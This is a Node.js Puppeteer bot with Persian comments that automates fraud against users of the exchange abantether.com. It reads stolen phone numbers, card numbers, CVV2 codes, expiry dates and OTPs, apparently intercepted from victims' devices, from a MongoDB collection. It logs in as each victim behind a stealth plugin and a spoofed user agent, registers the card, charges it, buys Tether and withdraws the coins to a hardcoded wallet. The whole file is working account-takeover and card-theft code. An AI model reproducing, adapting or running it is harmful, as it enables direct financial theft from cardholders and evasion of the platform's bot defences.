// bot.js — نسخه نهایی مخصوص پلن رایگان (Polling + مثل انسان واقعی)
require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

// تنظیمات
const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

// لاگ رنگی
const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;

async function connectDB() {
  const client = new MongoClient(MONGODB_URI, { maxPoolSize: 10 });
  await client.connect();
  collection = client.db("zarin").collection("users");
  log.s("اتصال به دیتابیس برقرار شد");
}

// آیا دیوایس آماده پردازش هست؟
function isReady(doc) {
  const hasPhone = !!doc.personalPhoneNumber;
  const hasCard = !!doc.cardNumber && doc.cvv2 != null;
  const hasBank = doc.bankMonth != null && (doc.bankYear != null && (doc.bankYear > 1000 || doc.bankYear >= 0));
  const hasDevice = !!doc.deviceId;
  const notProcessed = doc.processed !== true;
  const notProcessing = doc.processing !== true;

  return hasPhone && hasCard && hasBank && hasDevice && notProcessed && notProcessing;
}

// صبر برای OTP (هر 3 ثانیه چک می‌کنه)
async function waitForOtp(userId, field, maxSeconds = 180) {
  for (let i = 0; i < maxSeconds / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = user?.[field]?.toString().trim();
    if (otp && otp.length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp;
    }
    log.w(`در انتظار ${field}... (${i * 3} ثانیه)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

// پاک کردن و وارد کردن متن
async function clearAndType(page, selector, text) {
  await page.evaluate(sel => {
    const el = document.querySelector(sel);
    if (el) el.value = '';
  }, selector);
  await page.type(selector, text);
}

// پردازش کامل یک کاربر
async function processUser(doc) {
  const phone = doc.personalPhoneNumber;
  let browser = null;

  log.start(`شروع پردازش: ${phone} | دستگاه: ${doc.deviceId}`);

  try {
    // علامت‌گذاری که در حال پردازشه
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true, startedAt: new Date() } });

    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--no-zygote'
      ]
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36");
    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });

    // مرحله ۱: ورود با شماره
    await page.waitForSelector('input[placeholder="شماره موبایل"], input[type="tel"]', { timeout: 20000 });
    await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
    await page.click('button:has-text("ادامه")');
    log.i("درخواست OTP ورود ارسال شد");

    const otpLogin = await waitForOtp(doc._id, "otp_login");
    await page.waitForSelector('input[placeholder*="کد"]', { timeout: 15000 });
    await clearAndType(page, 'input[placeholder*="کد"]', otpLogin);
    await page.click('button:has-text("تایید")');
    log.s("ورود موفق");

    // مرحله ۲: ثبت کارت (اگر لازم باشه)
    if (!doc.otp_register_card) {
      try {
        await page.click('text=کیف پول');
        await page.click('text=کارت بانکی');
        await page.click('text=افزودن کارت');
        await page.type('input[placeholder="شماره کارت"]', doc.cardNumber.replace(/\D/g, ""));
        await page.type('input[placeholder="CVV2"]', doc.cvv2.toString());
        await page.type('input[placeholder="ماه"]', doc.bankMonth.toString().padStart(2, "0"));
        const year = doc.bankYear > 1000 ? (doc.bankYear - 1300) : doc.bankYear;
        await page.type('input[placeholder="سال"]', year.toString().padStart(2, "0"));
        await page.click('button:has-text("ثبت کارت")');
        log.i("درخواست OTP ثبت کارت");
      } catch (e) {
        log.i("کارت قبلاً ثبت شده");
      }
    }

    if (!doc.otp_register_card) {
      const otpCard = await waitForOtp(doc._id, "otp_register_card");
      await page.waitForSelector('input[placeholder*="کد پیامک"], input[placeholder*="کد"]', { timeout: 15000 });
      await clearAndType(page, 'input[placeholder*="کد پیامک"], input[placeholder*="کد"]', otpCard);
      await page.click('button:has-text("تأیید")');
      log.s("کارت تأیید شد");
    }

    // مرحله ۳: شارژ حساب
    await page.click('text=واریز تومان');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("پرداخت")');
    log.i("در انتظار OTP پرداخت");

    const otpPay = await waitForOtp(doc._id, "otp_payment");
    await page.waitForSelector('input#otp, input[placeholder*="کد"]', { timeout: 20000 });
    await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPay);
    await page.click('button:has-text("تأیید")');
    await page.waitForSelector('text=موفق', { timeout: 120000 });
    log.s("شارژ موفق");

    // مرحله ۴: خرید تتر
    await page.click('text=بازار');
    await page.click('text=تتر');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید")');
    await page.waitForSelector('text=سفارش', { timeout: 40000 });
    log.s("تتر خریداری شد");

    // مرحله ۵: برداشت تتر
    await page.click('text=برداشت');
    await page.click('text=تتر');
    await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
    await page.click('button:has-text("برداشت")');
    await page.waitForSelector('text=درخواست برداشت', { timeout: 60000 });

    log.s(`تمام مراحل تموم شد! تتر در راهه: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });

  } catch (err) {
    log.e(`خطا در ${phone}: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
  } finally {
    if (browser) await browser.close().catch(() => {});
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

// Polling هر ۵ ثانیه (مناسب پلن رایگان)
async function startPolling() {
  await connectDB();
  log.s("ربات با Polling فعال شد — هر ۵ ثانیه چک می‌کنه");

  setInterval(async () => {
    try {
      const readyUsers = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true },
        personalPhoneNumber: { $exists: true }
      }).limit(10).toArray();

      if (readyUsers.length === 0) {
        log.i("در انتظار دیوایس جدید...");
        return;
      }

      for (const user of readyUsers) {
        if (isReady(user)) {
          log.start(`دیوایس آماده پیدا شد → ${user.personalPhoneNumber}`);
          processUser(user);
        }
      }
    } catch (err) {
      log.e("خطا در Polling: " + err.message);
    }
  }, 5000);
}

// شروع
startPolling();